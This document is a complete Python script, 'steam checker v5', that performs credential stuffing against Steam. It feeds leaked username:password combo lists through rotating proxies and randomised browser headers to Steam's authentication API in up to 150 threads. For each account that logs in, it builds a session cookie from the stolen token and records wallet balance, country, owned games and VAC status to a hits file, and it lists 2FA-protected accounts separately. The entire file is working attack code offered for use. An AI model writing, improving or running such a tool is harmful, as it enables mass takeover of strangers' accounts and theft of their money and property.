import sys
import os
import json
import time
import base64
import threading
import itertools
import re
import signal
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import rsa
from fake_useragent import UserAgent
R  = '\033[0m'
B  = '\033[1m'
DM = '\033[2m'
GR = '\033[92m'
RD = '\033[91m'
AM = '\033[93m'
CY = '\033[96m'
WH = '\033[97m'
MU = '\033[90m'
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
def safe_write(text: str):
    try:
        sys.stdout.write(text)
    except UnicodeEncodeError:
        sys.stdout.write(text.encode('ascii', errors='replace').decode('ascii'))
def safe_flush():
    try:
        sys.stdout.flush()
    except Exception:
        pass
class UI:
    def __init__(self, total: int):
        self.total   = total
        self.done    = 0
        self.valid   = 0
        self.invalid = 0
        self.errors  = 0
        self.custom  = 0
        self.retries = 0
        self.queue   = 0
        self.lock    = threading.Lock()
        self.stop    = False
        self.spinner = itertools.cycle(['|', '/', '-', '\\'])
        self._done_offset = 0
        self._full_total = total
    def set_resume(self, done_offset: int, valid: int, invalid: int, custom: int, errors: int, retries: int):
        self._done_offset = done_offset
        self._full_total = done_offset + self.total
        self.valid   = valid
        self.invalid = invalid
        self.custom  = custom
        self.errors  = errors
        self.retries = retries
    def update_queue(self, delta: int):
        with self.lock:
            self.queue = max(0, self.queue + delta)
    def bump_retry(self):
        with self.lock:
            self.retries += 1
    def record_result(self, v=0, i=0, e=0, c=0):
        with self.lock:
            self.done += 1
            self.valid   += v
            self.invalid += i
            self.errors  += e
            self.custom  += c
    def log(self, text: str):
        with self.lock:
            safe_write(f"\r{' ' * 90}\r")
            safe_write(text + "\n")
            safe_flush()
    def banner(self):
        safe_write(f"{B}{WH}steam checker v5{R}\n\n")
        safe_flush()
    def draw(self):
        BAR_WIDTH = 30
        while not self.stop:
            with self.lock:
                spin  = next(self.spinner)
                pct   = (self._done_offset + self.done) / self._full_total if self._full_total > 0 else 0
                filled = int(BAR_WIDTH * pct)
                empty  = BAR_WIDTH - filled
                bar = f"{MU}▐{GR}{'█' * filled}{MU}{'░' * empty}▌{R}"
                stats = (
                    f"{WH}{self._done_offset + self.done}{MU}/{WH}{self._full_total}{R}  "
                    f"{GR}+{self.valid}{R}  "
                    f"{RD}-{self.invalid}{R}  "
                    f"{AM}!{self.errors}{R}  "
                    f"{CY}q:{self.queue}{R}  "
                    f"{MU}retry:{self.retries}{R}"
                )
                line = f"\r{GR}{spin}{R} {bar} {stats}"
                safe_write(line + "  " * 10)
                safe_flush()
            time.sleep(0.05)
def log_valid(ui: UI, name: str, elapsed: float, **fields):
    field_str = "  ".join(f"{MU}{k}={R}{WH}{v}{R}" for k, v in fields.items())
    with ui.lock:
        safe_write(f"\r{' ' * 90}\r{GR}+{R} {B}{WH}{name:<22}{R}  {field_str}  {DM}[{elapsed:.1f}s]{R}\n")
        safe_flush()
def log_error(ui: UI, name: str, err: str, max_chars: int = 45):
    short = err[:max_chars]
    text = f"\r{AM}!{R} {AM}{name:<22}{R} {MU}error{R} {DM}({short}){R}"
    ui.log(text)
def log_resolved(ui: UI, name: str):
    text = f"\r{WH}~{R} {WH}{name:<22}{R} {MU}max retries, unresolved{R}"
    ui.log(text)
def get_input(label: str, default=None, cast=str):
    while True:
        try:
            if default is not None:
                raw = input(f"  {MU}{label}{R} {DM}(default {default}) >{R} ").strip()
                if not raw:
                    return default
            else:
                raw = input(f"  {MU}{label}{R} {DM}>{R} ").strip()
                if not raw:
                    print(f"  {RD}no input given{R}")
                    continue
            if cast == int:
                return int(float(raw))
            return cast(raw)
        except ValueError:
            print(f"  {RD}invalid input{R}")
def setup():
    while True:
        raw = input(f"  {MU}combo file{R} {DM}>{R} ").strip()
        if not raw:
            print(f"  {RD}no file given{R}")
            continue
        path = Path(raw)
        if not path.exists() and not raw.endswith(".txt"):
            alt = Path(raw + ".txt")
            if alt.exists():
                path = alt
        if not path.exists():
            print(f"  {RD}not found:{R} {WH}{raw}{R}")
            continue
        try:
            preview = open(path, "r", encoding="latin-1").read(200)
        except Exception:
            print(f"  {RD}cannot read file{R}")
            continue
        if ":" not in preview:
            print(f"  {RD}no user:pass entries detected in file{R}")
            continue
        break
    threads = get_input("threads", default=150, cast=int)
    retries = get_input("retries (0 = unlimited)", default=3, cast=int)
    return path, threads, retries
def load_targets(path: Path) -> list:
    items = []
    with open(path, "r", encoding="latin-1") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if ":" in line:
                parts = line.split(":", 1)
                if len(parts) == 2 and parts[0] and parts[1]:
                    items.append((parts[0], parts[1]))
    return items
def print_summary(total: int, threads: int, retries: int, proxies: int):
    print(f"  {B}{WH}{total}{R} {MU}accounts{R} {DM}|{R} "
          f"{B}{WH}{threads}{R} {MU}threads{R} {DM}|{R} "
          f"{MU}retries:{R} {B}{WH}{retries}{R} {DM}|{R} "
          f"{MU}proxies:{R} {B}{WH}{proxies}{R}")
def final_summary(ui: UI):
    safe_write(f"\r{' ' * 90}\r")
    print(f"  {GR}{B}done{R} {DM}|{R} "
          f"{GR}+{ui.valid}{R} {MU}valid{R} {DM}|{R} "
          f"{RD}-{ui.invalid}{R} {MU}invalid{R} {DM}|{R} "
          f"{AM}2fa:{ui.custom}{R} {DM}|{R} "
          f"{AM}!{ui.errors}{R} {MU}errors{R} {DM}|{R} "
          f"{MU}retried:{ui.retries}{R}")
class ProxyEngine:
    def __init__(self):
        self.pool = []
        self.index = 0
        self.lock = threading.Lock()
    def load(self, filepath: str | None = None) -> int:
        loaded = set()
        paths = []
        if filepath:
            paths = [filepath]
        else:
            candidates = ["proxies.txt", "rotating.txt", "sticky.txt"]
            for name in candidates:
                if os.path.exists(name):
                    paths.append(name)
            if not paths:
                print(f"  {AM}no proxies.txt found{R}")
                while not paths:
                    ans = input(f"  {MU}proxy file path{R} {DM}>{R} ").strip()
                    if not ans:
                        continue
                    p = Path(ans)
                    if not p.exists():
                        print(f"  {RD}not found:{R} {WH}{ans}{R}")
                        continue
                    paths.append(ans)
                while True:
                    more = input(f"  {MU}any more proxy files? (enter to skip){R} {DM}>{R} ").strip()
                    if not more:
                        break
                    mp = Path(more)
                    if not mp.exists():
                        print(f"  {RD}not found:{R} {WH}{more}{R}")
                        continue
                    paths.append(more)
        for fname in paths:
            with open(fname, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    parsed = self._parse(line)
                    if parsed and parsed not in loaded:
                        self.pool.append(parsed)
                        loaded.add(parsed)
        return len(self.pool)
    def _parse(self, line: str) -> str | None:
        line = line.strip()
        if not line:
            return None
        rest = line
        for s in ("socks5://", "socks4://", "https://", "http://"):
            if line.lower().startswith(s):
                rest = line[len(s):]
                break
        if "@" in rest:
            auth, hostpart = rest.rsplit("@", 1)
            if ":" in hostpart:
                host, port = hostpart.rsplit(":", 1)
            else:
                host, port = hostpart, "1080"
            if ":" in auth:
                user, pw = auth.split(":", 1)
            else:
                user, pw = auth, ""
            return f"http://{user}:{pw}@{host}:{port}"
        parts = rest.split(":")
        if len(parts) == 2:
            host, port = parts
            if host and port:
                return f"http://{host}:{port}"
            return None
        if len(parts) == 4:
            host, port, user, pw = parts
            return f"http://{user}:{pw}@{host}:{port}"
        if len(parts) >= 5:
            host = parts[0]
            port = parts[1]
            pw = parts[-1]
            user = ":".join(parts[2:-1])
            return f"http://{user}:{pw}@{host}:{port}"
        return None
    def get(self) -> dict | None:
        if not self.pool:
            return None
        with self.lock:
            self.index = (self.index + 1) % len(self.pool)
            return {"http": self.pool[self.index], "https": self.pool[self.index]}

    def mark_fail(self, proxy_dict: dict):
        pass

    def mark_ok(self, proxy_dict: dict):
        pass

    def active_count(self) -> int:
        return len(self.pool)
TRANSIENT = {"empty", "server_error", "malformed"}
DEFINITIVE = {"invalid", "2fa", "ratelimit"}
class SteamAuth:
    def __init__(self, timeout: int = 15, poll_attempts: int = 4, poll_delay: float = 1.5):
        self.timeout = timeout
        self.poll_attempts = poll_attempts
        self.poll_delay = poll_delay
        self.ua = UserAgent()
    def build_session(self, proxy: dict | None) -> requests.Session:
        s = requests.Session()
        if proxy:
            s.proxies = proxy
        s.headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://store.steampowered.com",
            "Referer": "https://store.steampowered.com/",
            "Sec-Ch-Ua": '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": self.ua.random,
            "Priority": "u=1, i"
        }
        return s
    def get_rsa_key(self, session: requests.Session, username: str) -> dict | None:
        url = "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
        params = {
            'origin': 'https://store.steampowered.com',
            'input_json': json.dumps({'account_name': username})
        }
        resp = session.get(url, params=params, timeout=self.timeout)
        if resp.status_code != 200:
            return None
        data = resp.json()
        if "response" not in data:
            return None
        return data["response"]
    def encrypt_password(self, password: str, key_data: dict) -> str | None:
        try:
            mod = int(key_data["publickey_mod"], 16)
            exp = int(key_data["publickey_exp"], 16)
            pub_key = rsa.PublicKey(mod, exp)
            encrypted = rsa.encrypt(password.encode("utf-8"), pub_key)
            return base64.b64encode(encrypted).decode("utf-8")
        except Exception:
            return None
    def authenticate(self, session: requests.Session, username: str,
                     encrypted_pw: str, timestamp: str) -> requests.Response:
        url = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1"
        payload = {
            "device_friendly_name": session.headers["User-Agent"],
            "account_name": username,
            "encrypted_password": encrypted_pw,
            "encryption_timestamp": timestamp,
            "remember_login": True,
            "platform_type": 2,
            "persistence": 1,
            "website_id": "Store"
        }
        return session.post(url, data={'input_json': json.dumps(payload)}, timeout=self.timeout)
    def classify(self, resp: requests.Response):
        try:
            body = resp.json()
        except (json.JSONDecodeError, ValueError):
            return ("malformed", None, "JSON decode failed")
        if not isinstance(body, dict):
            return ("malformed", None, f"expected dict, got {type(body).__name__}")
        if resp.status_code == 429:
            return ("ratelimit", None, "HTTP 429")
        if resp.status_code >= 500:
            return ("server_error", None, f"HTTP {resp.status_code}")
        if "response" not in body:
            return ("empty", None, "missing 'response' key")
        res = body["response"]
        if res is None:
            eresult = resp.headers.get("x-eresult", "")
            if eresult == "5":
                return ("invalid", None, "EResult 5")
            return ("empty", None, "null response")
        if not isinstance(res, dict):
            return ("malformed", None, f"response is {type(res).__name__}")
        if not res:
            eresult = resp.headers.get("x-eresult", "")
            if eresult == "5":
                return ("invalid", None, "EResult 5 (empty dict)")
            return ("empty", None, "empty dict")
        if res.get("interval") == 5 and "client_id" not in res:
            return ("invalid", None, "interval=5, no client_id")
        if "client_id" not in res:
            if res.get("interval", 0) > 5:
                return ("ratelimit", None, f"interval={res.get('interval')}")
            return ("malformed", None, f"no client_id: {str(res)[:80]}")
        confirmations = res.get("allowed_confirmations", [])
        has_2fa = any(c.get("confirmation_type", 0) != 1 for c in confirmations)
        if has_2fa:
            return ("2fa", res, "non-email confirmation")
        return ("success", res, "")
    def poll_token(self, session: requests.Session, client_id: str, request_id: str) -> str | None:
        url = "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1"
        for _ in range(self.poll_attempts):
            try:
                resp = session.post(url, data={'input_json': json.dumps({
                    "client_id": client_id, "request_id": request_id
                })}, timeout=self.timeout)
                token = resp.json().get("response", {}).get("access_token")
                if token:
                    return token
            except Exception:
                pass
            time.sleep(self.poll_delay)
        return None
    def get_games(self, session: requests.Session, steamid: str, token: str) -> tuple[str, str]:
        url = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/"
        params = {"access_token": token, "steamid": steamid,
                  "include_appinfo": 1, "include_played_free_games": 1}
        while True:
            try:
                resp = session.get(url, params=params, timeout=self.timeout)
                data = resp.json().get("response", {})
                count = str(data.get("game_count", 0))
                if "games" in data:
                    games = sorted(data["games"], key=lambda x: x.get("playtime_forever", 0), reverse=True)
                    names = [g.get("name", "?") for g in games]
                    return count, ", ".join(names) if names else "None"
                return count, "None"
            except Exception:
                time.sleep(1)
    def get_wallet_country(self, session: requests.Session, forged_cookie: str) -> tuple[str, str]:
        while True:
            try:
                session.cookies.set("steamLoginSecure", forged_cookie, domain="store.steampowered.com")
                resp = session.get("https://store.steampowered.com/account/", timeout=self.timeout)
                text = resp.text
                if resp.status_code == 403 or "Family View" in text:
                    return "0.00", "Unknown"
                bal = "0.00"
                if 'class="accountData price"' in text:
                    raw = text.split('class="accountData price"')[1].split('</div>')[0]
                    bal = re.sub(r'<[^>]+>', '', raw).strip()
                elif 'id="header_wallet_balance">' in text:
                    bal = text.split('id="header_wallet_balance">')[1].split('<')[0].strip()
                country = "Unknown"
                if 'class="account_data_field">' in text:
                    country = text.split('class="account_data_field">')[1].split('<')[0].strip()
                return bal, country
            except Exception:
                time.sleep(1)
    def get_vac(self, session: requests.Session, forged_cookie: str, steamid: str) -> tuple[str, str]:
        while True:
            try:
                session.cookies.set("steamLoginSecure", forged_cookie, domain="steamcommunity.com")
                resp = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=self.timeout)
                text = resp.text
                if resp.status_code == 403 or "Family View" in text:
                    return "unknown", ""
                vac = "false"
                days = ""
                if 'class="profile_ban"' in text:
                    vac = "true"
                    if 'class="profile_ban_status"' in text:
                        block = text.split('class="profile_ban_status"')[1].split('class="profile_ban_footer"')[0]
                        clean = re.sub(r'<[^>]+>', '', block)
                        nums = re.findall(r'(\d+)', clean)
                        valid = [int(n) for n in nums if int(n) < 20000]
                        if valid:
                            days = f" | Days since last VAC ban = {max(valid)}"
                return vac, days
            except Exception:
                time.sleep(1)
_auth: SteamAuth | None = None
_proxies: ProxyEngine | None = None
_output_lock = threading.Lock()
_session_fingerprint: str = ""
_session_file: str = "session_state.json"
_shutdown = threading.Event()
def save_hit(filename: str, data: str):
    with _output_lock:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(data + "\n")
def save_session_state(checked: int, hits: int, bads: int, custom: int, retries: int, errors: int):
    global _session_fingerprint
    if not _session_fingerprint:
        return
    try:
        if os.path.exists(_session_file):
            with open(_session_file, "r") as f:
                data = json.load(f)
        else:
            data = {"sessions": {}}
        data["sessions"][_session_fingerprint] = {
            "checked": checked, "hits": hits, "bads": bads,
            "custom": custom, "retries": retries, "errors": errors,
            "last_updated": time.strftime("%Y-%m-%dT%H:%M:%S")
        }
        tmp = _session_file + ".tmp"
        with open(tmp, "w") as f:
            json.dump(data, f, indent=4)
        os.replace(tmp, _session_file)
    except Exception:
        pass
def load_session_state(fingerprint: str) -> dict | None:
    try:
        if not os.path.exists(_session_file):
            return None
        with open(_session_file, "r") as f:
            data = json.load(f)
        return data.get("sessions", {}).get(fingerprint)
    except Exception:
        return None
def check_item(args, ui: UI, max_retries: int):
    username, password = args
    start_t = time.time()
    attempt = 1
    auth = _auth
    proxies = _proxies
    while not _shutdown.is_set():
        if max_retries > 0 and attempt > max_retries:
            log_resolved(ui, username)
            save_hit("unresolved.txt", f"{username}:{password}")
            ui.record_result(e=1)
            return
        if attempt > 1:
            ui.bump_retry()
        proxy = proxies.get() if proxies and proxies.pool else None
        ui.update_queue(+1)
        try:
            session = auth.build_session(proxy)
            try:
                key_data = auth.get_rsa_key(session, username)
            except requests.exceptions.Timeout:
                proxies.mark_fail(proxy)
                attempt += 1; continue
            except requests.exceptions.ConnectionError:
                proxies.mark_fail(proxy)
                attempt += 1; continue
            except requests.exceptions.ProxyError:
                proxies.mark_fail(proxy)
                attempt += 1; continue
            except Exception:
                attempt += 1; continue
            if not key_data:
                attempt += 1; continue
            encrypted = auth.encrypt_password(password, key_data)
            if not encrypted:
                log_error(ui, username, "crypto failure")
                save_hit("unresolved.txt", f"{username}:{password}")
                ui.update_queue(-1)
                ui.record_result(e=1)
                return
            try:
                login_resp = auth.authenticate(session, username, encrypted, key_data["timestamp"])
            except requests.exceptions.Timeout:
                proxies.mark_fail(proxy)
                attempt += 1; continue
            except requests.exceptions.ConnectionError:
                proxies.mark_fail(proxy)
                attempt += 1; continue
            except requests.exceptions.ProxyError:
                proxies.mark_fail(proxy)
                attempt += 1; continue
            except Exception:
                attempt += 1; continue
            result_type, result_data, result_detail = auth.classify(login_resp)
            if result_type in DEFINITIVE:
                ui.update_queue(-1)
                if result_type == "invalid":
                    ui.record_result(i=1)
                elif result_type == "2fa":
                    save_hit("custom.txt", f"{username}:{password} | 2FA")
                    ui.record_result(c=1)
                elif result_type == "ratelimit":
                    log_error(ui, username, "rate limited")
                    if max_retries == 0 or attempt < max_retries:
                        attempt += 1; continue
                    save_hit("unresolved.txt", f"{username}:{password}")
                    ui.record_result(e=1)
                return
            if result_type in TRANSIENT:
                attempt += 1
                continue
            proxies.mark_ok(proxy)
            client_id = result_data["client_id"]
            request_id = result_data["request_id"]
            steamid = result_data["steamid"]
            token = auth.poll_token(session, client_id, request_id)
            if not token:
                if attempt < max_retries:
                    attempt += 1; continue
                log_error(ui, username, "token poll failed")
                save_hit("unresolved.txt", f"{username}:{password}")
                ui.update_queue(-1)
                ui.record_result(e=1)
                return
            forged = f"{steamid}||{token}"
            game_count, game_list = auth.get_games(session, steamid, token)
            wallet, country = auth.get_wallet_country(session, forged)
            vac, vac_days = auth.get_vac(session, forged, steamid)
            hit_line = (f"{username}:{password} | Wallet Balance = {wallet} | "
                        f"Games owned = {game_list} | Country = {country} | "
                        f"VAC ban = {vac}{vac_days} | SteamID = {steamid}")
            elapsed = time.time() - start_t
            log_valid(ui, username, elapsed, bal=wallet, games=game_count, country=country)
            save_hit("hits.txt", hit_line)
            ui.update_queue(-1)
            ui.record_result(v=1)
            return
        except Exception as e:
            err = str(e)
            if attempt < max_retries:
                attempt += 1
                continue
            save_hit("unresolved.txt", f"{username}:{password}")
            ui.update_queue(-1)
            ui.record_result(e=1)
            return
    ui.update_queue(-1)
def main():
    global _auth, _proxies, _session_fingerprint
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{B}{WH}steam checker v5{R}\n")
    for fname in ["hits.txt", "custom.txt", "unresolved.txt", "proxies.txt"]:
        if not os.path.exists(fname):
            Path(fname).touch()
            print(f"  {MU}created {fname}{R}")
    try:
        path, threads, retries = setup()
    except KeyboardInterrupt:
        print(f"\n  {RD}aborted{R}")
        return
    targets = load_targets(path)
    total = len(targets)
    if total == 0:
        print(f"  {RD}no user:pass entries found in file{R}")
        return
    _proxies = ProxyEngine()
    proxy_count = _proxies.load()
    if proxy_count == 0:
        print(f"  {RD}no proxies loaded — refusing to run proxyless{R}")
        return
    print(f"  {MU}loaded{R} {WH}{proxy_count}{R} {MU}proxies{R}")
    file_size = os.path.getsize(path)
    first_line = targets[0][0] + ":" + targets[0][1] if targets else ""
    last_line = targets[-1][0] + ":" + targets[-1][1] if targets else ""
    _session_fingerprint = f"{path.name}|{file_size}|{first_line}|{last_line}"
    saved = load_session_state(_session_fingerprint)
    skip = 0
    if saved:
        print(f"\n  {AM}previous session found:{R}")
        print(f"  {MU}checked={WH}{saved.get('checked',0)}{R}  "
              f"{GR}hits={WH}{saved.get('hits',0)}{R}  "
              f"{RD}invalid={WH}{saved.get('bads',0)}{R}")
        resume = get_input("resume? (y/n)", default="y", cast=str).lower()
        if resume.startswith("y"):
            skip = saved.get("checked", 0)
            print(f"  {MU}resuming from line {WH}{skip}{R}")
        else:
            try:
                if os.path.exists(_session_file):
                    with open(_session_file, "r") as f:
                        data = json.load(f)
                    data.get("sessions", {}).pop(_session_fingerprint, None)
                    with open(_session_file, "w") as f:
                        json.dump(data, f, indent=4)
            except Exception:
                pass
            print(f"  {MU}starting fresh{R}")
    targets = targets[skip:]
    _auth = SteamAuth(timeout=15, poll_attempts=4, poll_delay=1.5)
    print()
    print_summary(len(targets) + skip, threads, retries, proxy_count)
    ui = UI(len(targets))
    if skip and saved:
        ui.set_resume(
            done_offset=skip,
            valid=saved.get('hits', 0),
            invalid=saved.get('bads', 0),
            custom=saved.get('custom', 0),
            errors=saved.get('errors', 0),
            retries=saved.get('retries', 0),
        )
    draw_thread = threading.Thread(target=ui.draw, daemon=True)
    draw_thread.start()
    save_lock = threading.Lock()
    def periodic_save():
        while not ui.stop:
            time.sleep(5)
            with save_lock:
                if not ui.stop:
                    save_session_state(ui.done + skip, ui.valid, ui.invalid, ui.custom, ui.retries, ui.errors)
    save_thread = threading.Thread(target=periodic_save, daemon=True)
    save_thread.start()
    tasks = [(u, p) for u, p in targets]
    executor = ThreadPoolExecutor(max_workers=threads)
    def signal_handler(sig, frame):
        print(f"\n  {AM}Ctrl+C — draining...{R}")
        _shutdown.set()
        executor.shutdown(wait=False, cancel_futures=True)
        ui.stop = True
        time.sleep(0.2)
        save_session_state(ui.done + skip, ui.valid, ui.invalid, ui.custom, ui.retries, ui.errors)
        final_summary(ui)
        os._exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    try:
        futures = [executor.submit(check_item, t, ui, retries) for t in tasks]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass
    except KeyboardInterrupt:
        print(f"\n  {RD}interrupted — saving{R}")
        executor.shutdown(wait=False, cancel_futures=True)
        ui.stop = True
        time.sleep(0.2)
        save_session_state(ui.done + skip, ui.valid, ui.invalid, ui.custom, ui.retries, ui.errors)
        final_summary(ui)
        return
    ui.stop = True
    time.sleep(0.15)
    save_session_state(ui.done + skip, ui.valid, ui.invalid, ui.custom, ui.retries, ui.errors)
    final_summary(ui)
    print()
if __name__ == "__main__":
    main()
